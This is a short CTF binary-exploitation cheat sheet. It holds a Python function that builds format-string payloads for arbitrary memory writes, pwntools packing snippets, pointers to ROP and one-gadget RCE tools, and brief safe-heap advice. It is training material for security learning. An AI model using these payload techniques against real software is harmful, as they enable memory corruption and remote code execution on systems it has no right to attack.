# pwn-cheat-sheet

### Format string - write value into address
###### taken from https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/Binary/12-echo_back-500/solution.md
```python
def write_memory(address, value):
  v1 = (value & 0x0000FFFF) - 8
  v2 = (value >> 16) - (value & 0x0000FFFF)

  if v2 < 0:
    v2 += 0x00010000

  ret = p32(address) + p32(address + 2) + '%{}x'.format(v1) + '%7$hn'

  if v2 != 0:
    ret += '%{}x'.format(v2)

  ret += '%8$hn'

  return ret
  ```
### Pack (int to str)
###### taken from http://docs.pwntools.com/en/stable/util/packing.html
```
p32(0x12345678)         # 4 byte value
p64(0x1234567812345678) # 8 byte value
```

### Unpack (str to int)
###### taken from http://docs.pwntools.com/en/stable/util/packing.html
```
u = make_unpacker(32, endian='little', sign='unsigned') # 4 byte value
u = make_unpacker(64, endian='little', sign='unsigned') # 8 byte value
```

### ROPgadget
###### taken from https://github.com/JonathanSalwan/ROPgadget
This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures.

### one_gadget
###### taken from https://github.com/david942j/one_gadget
Tool for finding one gadget RCE in libc

### libc-database
###### taken from https://github.com/niklasb/libc-database
Database of libc functions offsets

### Safe heap managements
* After free(X) set X value to 0
* After malloc(size) reset the memory region you got, or initialize the memory with default safe values

**Without these operations the code may be vulnarble !! (UAF, Double Free, etc..)**
